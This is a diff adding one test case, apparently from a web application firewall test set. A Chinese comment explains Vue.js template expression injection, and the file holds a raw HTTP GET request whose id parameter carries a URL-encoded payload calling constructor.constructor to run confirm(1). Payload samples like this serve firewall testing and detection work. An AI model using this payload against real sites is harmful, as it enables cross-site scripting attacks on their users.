@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_框架_VueJS-06506716
+# 在 Vue.js 的模板中，双花括号（{{}}）用于绑定数据到模板上。通常情况下，这些表达式会被计算并将结果显示在页面上。然而，由于一些特定情况下的不当使用，可能会导致表达式注入漏洞。通过调用构造函数的构造函数，构造了一个新的函数对象。
+GET /?id=%7B%7Bconstructor.constructor%28%27confirm%281%29%27%29%28%29%7D%7D&bid=hd_tag_m8mv25gn HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25gn
+RM-PRO-Token: 90907b0c9d81a42a3f18bf169f91410d
+RM-PRO-Time: 1742808466918
+User-Agent: curl/7.83.1
+
